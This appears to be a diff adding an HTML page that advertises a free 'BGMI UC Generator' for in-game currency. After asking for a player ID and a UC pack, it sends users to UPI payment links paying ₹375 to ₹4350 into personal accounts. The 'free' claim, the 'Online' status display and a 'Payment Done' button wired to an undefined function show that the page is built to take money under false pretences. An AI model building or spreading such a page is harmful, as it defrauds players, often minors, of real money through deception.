@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+    <title>BGMI UC Free </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="description" content="Apk Beast • Free App Tweaks & Mods" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <link rel="icon" type="image/png" href="./qrimg/bgmilogo.webp" />
+    <meta name="theme-color" content="#000000">
+    <link rel="stylesheet" href="./pubg-uc-free.netlify.app/css/icon-font.min.css">
+    <link rel="stylesheet" href="./pubg-uc-free.netlify.app/css/all2.css">
+    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,700,900&amp;display=swap" rel="stylesheet">
+    <link href="./pubg-uc-free.netlify.app/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="./pubg-uc-free.netlify.app/css/animate.css" rel="stylesheet" />
+    <link href="./pubg-uc-free.netlify.app/css/style.css" rel="stylesheet" />
+    <link href="./pubg-uc-free.netlify.app/css/sweetalert2.css" rel="stylesheet" />
+    <link href="./pubg-uc-free.netlify.app/css/payment.css" rel="stylesheet" />
+    <script src="./pubg-uc-free.netlify.app/js/vanillatoasts.js"></script>
+    <script src="./pubg-uc-free.netlify.app/js/live.js"></script>
+    <link href="./pubg-uc-free.netlify.app/css/vanillatoasts.css" rel="stylesheet" />
+
+    <style>
+        input[type="value"] {
+            font-size: 32px;
+        }
+
+        input[type="text"] {
+            -moz-appearance: none;
+            -webkit-appearance: none;
+            -ms-appearance: none;
+            appearance: none;
+            background: #e7e7e7;
+            border: 0;
+            border-radius: 10px;
+            color: #222222;
+            display: block;
+            outline: 0;
+            padding: 0 1em;
+            text-decoration: none;
+            width: 100%;
+        }
+
+        input::-moz-focus-inner {
+            border: 0;
+            padding: 0;
+        }
+
+        input {
+            color: #222222;
+            font-size: 30px;
+            font-weight: 600;
+            letter-spacing: 0.025em;
+            line-height: 1.65;
+        }
+
+        #spiner {
+            font-size: 2.6em;
+            display: block;
+            text-align: center;
+            margin: 20px auto;
+            color: #8400ff;
+        }
+
+        /* QR Payment Image Styling */
+        .qr-image {
+            max-width: 400px; /* Increase the size of the QR code */
+            width: 100%;
+            height: auto;
+            border: 4px solid #8400ff;
+            border-radius: 10px;
+        }
+
+        /* Styling the Payment Done Button */
+        .payment-done-btn {
+            background-color: #8400ff; /* Purple color for the button */
+            color: rgb(236, 202, 202); /* White text color */
+            font-size: 18px; /* Font size */
+            padding: 10px 20px; /* Padding for button size */
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%; /* Full width button */
+            margin-left: 150px;
+        }
+
+        .payment-done-btn:hover {
+            background-color: #8a3bd4; /* Darker shade on hover */
+            transition: 0.1s ease;
+        }
+
+        .payment-done-btn2 {
+            background-color: #8400ff; /* Purple color for the button */
+            color: rgb(236, 202, 202); /* White text color */
+            font-size: 18px; /* Font size */
+            padding: 10px 20px; /* Padding for button size */
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%; /* Full width button */
+            margin-left: 150px;
+        }
+
+        .payment-done-btn2:hover {
+            background-color: #8a3bd4; /* Darker shade on hover */
+            transition: 0.1s ease;
+        }
+
+        .hide {
+            display: none;
+        }
+
+        .swal2-popup {
+            border-radius: 30px;
+        }
+
+        .float {
+            position: fixed;
+            width: 55px;
+            height: 55px;
+            bottom: 40px;
+            right: 40px;
+            background-color: #8400ff;
+            color: #FFF;
+            border-radius: 50px;
+            text-align: center;
+            box-shadow: 2px 2px 3px #999;
+        }
+
+        .float:hover {
+            color: #000;
+            background-color: #fff;
+        }
+
+        .my-float {
+            margin-top: 19px;
+        }
+
+        strike {
+            color: red;
+        }
+
+        /* Style for clickable platform items */
+        .platform-item.selected {
+            background-color: #8400ff; /* Purple color when selected */
+            color: white;
+            border-radius: 10px;
+            box-shadow: 0px 0px 8px rgba(0, 0, 0, 0.2);
+            transition: background-color 0.3s ease;
+        }
+
+        /* Hover effect for platform items */
+        .platform-item:hover {
+            background-color: #f1f1f1; /* Light gray on hover */
+            cursor: pointer;
+        }
+
+        /* UC item selected state */
+        .platform-item1.selected {
+            border: 2px solid #8400ff;
+            background-color: #f7f7f7;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .platform-item1:hover {
+            background-color: #fafafa;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body onload="create()">
+    <div id="bg"></div>
+    <div class="overlay-pattern"></div>
+    <div class="overlay"></div>
+    <section class="app-download-section">
+        <div class="container">
+            <div class="app-download-wrapper animated flipInX">
+                <div class="app-icon-wrapper">
+                    <div class="app-icon-inner-wrapper">
+                        <img src="/qrimg/bgmi.webp" class="app-icon-img img-fluid" />
+                    </div>
+                </div>
+                <div class="app-download-content">
+                    <div class="app-download-content-header">
+                        <h1><span>BGMI </span> •  UC Generator FREE •</h1>
+                        <span>Working In 2024-25</span>
+                    </div>
+                    <div class="app-download-status">
+                        <div class="status-row row-first animated bounceIn animation-delay-400">
+                            <span class="status-label">Status:</span>
+                            <span id="status" class="status-dynamic">Online</span>
+                        </div>
+                        <div class="status-row row-second odd animated bounceIn animation-delay-600">
+                            <span class="status-label">Last Update:</span>
+                            <span id="date" class="status-dynamic"></span>
+                        </div>
+                        <div class="status-row row-last animated bounceIn animation-delay-800">
+                            <span class="status-label">Online Users:</span>
+                            <span id="online-count" class="status-dynamic"></span>
+                        </div>
+                    </div>
+                    <div id="control">
+                        <div class="app-download-main animated bounceIn">
+                            <div class="button-wrapper">
+                                <div id="b-1" onclick="nexT();playAu()" class="button animated pulse infinite"><span>GET UC NOW</span></div>
+                            </div>
+                            <div style="margin-top: 30px;">
+                            </div>
+                        </div>
+                    </div>
+                    <div id="show" class="hide">
+                        <div class="app-download-main animated bounceIn">
+                            <p class="app-download-intro-text">Enter Your Player ID</p>
+                            <form action="javascript:void(0);" name="Form">
+                                <input type="text" name="usernameInput" value="" maxlength="10" required />
+                            </form>
+                            <br>
+                            <p class="app-download-intro-text">Choose Your Operating System:</p>
+                            <div class="field-wrapper platform-field-wrapper">
+                                <div id="devices">
+                                    <div class="row small-margin">
+                                        <div class="col small-padding">
+                                            <div onclick="selectPlatform('android')" class="platform-item platform-item-1">
+                                                <i class="fab fa-android"></i>
+                                                <span>Android</span>
+                                            </div>
+                                        </div>
+                                        <div class="col small-padding">
+                                            <div onclick="selectPlatform('ios')" class="platform-item platform-item-2">
+                                                <i class="fab fa-apple"></i>
+                                                <span>iOS</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <p class="app-download-intro-text">Select UC :</p>
+                            <div id="currency">
+                                <div class="row small-margin">
+                                    <div class="col small-padding">
+                                        <div onclick="selectUC('770')" class="platform-item1 platform-item-2">
+                                            <img src="./pubg-uc-free.netlify.app/img/followers.png">
+                                            <span>770 UC / ₹375<br></span>
+                                        </div>
+                                    </div>
+                                    <div class="col small-padding">
+                                        <div onclick="selectUC('8100')" class="platform-item1 platform-item-2">
+                                            <img src="./pubg-uc-free.netlify.app/img/followers.png">
+                                            <span>8,100 UC/ ₹1650<br></span>
+                                        </div>
+                                    </div>
+                                    <div class="col small-padding">
+                                        <div onclick="selectUC('20100')" class="platform-item1 platform-item-2">
+                                            <img src="./pubg-uc-free.netlify.app/img/followers2.png">
+                                            <span>20,100 UC/ ₹2250 <br></span>
+                                        </div>
+                                    </div>
+                                    <div class="col small-padding">
+                                        <div onclick="selectUC('32000')" class="platform-item1 platform-item-2">
+                                            <img src="./pubg-uc-free.netlify.app/img/followers2.png">
+                                            <span>32,000 UC/ ₹4350<br></span>
+                                        </div>
+                                    </div>
+                                    <div class="button-wrapper">
+                                        <div id="b-2" onclick="nexT1()" class="button animated pulse infinite"><span class="lnr lnr-download"></span><span>Continue</span></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- QR Code section replaced with payment buttons -->
+                    <div id="verify" class="hide">
+                        <div class="app-download-main animated bounceIn">
+                            <div class="app-download-content-header">
+                                <span>Payment verification</span>
+                                <p>Select your Payment Option:</p>
+                                <!-- Payment Buttons -->
+                                <div class="button-wrapper">
+                                    <button class="pay-button !important" id="pay1">Pay ₹375 (770 UC)</button>
+                                    <button class="pay-button" id="pay2">Pay ₹1650 (8100 UC)</button>
+                                    <button class="pay-button" id="pay3">Pay ₹2250 (20100 UC)</button>
+                                    <button class="pay-button" id="pay4">Pay ₹4350 (32000 UC)</button>
+                                </div>
+                            </div>
+                            <div id="verify-content">
+                                <div class="row">
+                                    <div class="col-sm-6">
+                                        <div class="verification-step">
+                                            <!-- Payment Done Button -->
+                                            <div class="button-wrapper">
+                                                <button class="payment-done-btn" onclick="paymentDone()">Payment Done</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/sweetalert2.all.min.js"></script>
+
+    <script>
+        function nexT() {
+            // Hide first step and show the next step
+            document.getElementById('show').classList.remove('hide');
+            document.getElementById('control').classList.add('hide');
+        }
+
+        function nexT1() {
+            // Show the verification step (payment buttons)
+            document.getElementById('verify').classList.remove('hide');
+            document.getElementById('show').classList.add('hide');
+        }
+
+        function selectPlatform(platform) {
+            const platforms = document.querySelectorAll('.platform-item');
+            platforms.forEach(platformItem => {
+                platformItem.classList.remove('selected'); // Remove 'selected' class from all items
+            });
+
+            // Add the 'selected' class to the clicked platform
+            event.target.classList.add('selected');
+        }
+
+        function selectUC(uc) {
+            const ucs = document.querySelectorAll('.platform-item1');
+            ucs.forEach(ucItem => {
+                ucItem.classList.remove('selected'); // Remove 'selected' class from all UC items
+            });
+
+            // Add the 'selected' class to the clicked UC option
+            event.target.classList.add('selected');
+        }
+
+        // Payment Button Event Listeners
+        document.getElementById('pay1').addEventListener('click', function () {
+            window.location.href = "upi://pay?pa=saniyazohara@fam&pn=Receiver&mc=0000&tid=1234567890&tr=123456&tn=Payment%20for%20UC&am=375&cu=INR";
+        });
+
+        document.getElementById('pay2').addEventListener('click', function () {
+            window.location.href = "upi://pay?pa=saniyazohara@fam&pn=Receiver&mc=0000&tid=1234567890&tr=123456&tn=Payment%20for%20UC&am=1650&cu=INR";
+        });
+
+        document.getElementById('pay3').addEventListener('click', function () {
+            window.location.href = "upi://pay?pa=meetgparekh123-1@okhdfcbank&pn=Receiver&mc=0000&tid=1234567890&tr=123456&tn=Payment%20for%20UC&am=2250&cu=INR";
+        });
+
+        document.getElementById('pay4').addEventListener('click', function () {
+            window.location.href = "upi://pay?pa=saniyazohara@fam&pn=Receiver&mc=0000&tid=1234567890&tr=123456&tn=Payment%20for%20UC&am=4350&cu=INR";
+        });
+
+        function playAu() {
+            // Play sound or other actions
+            var audio = new Audio('path-to-your-sound-file.mp3');
+            audio.play();
+        }
+    </script>
+
+</html>
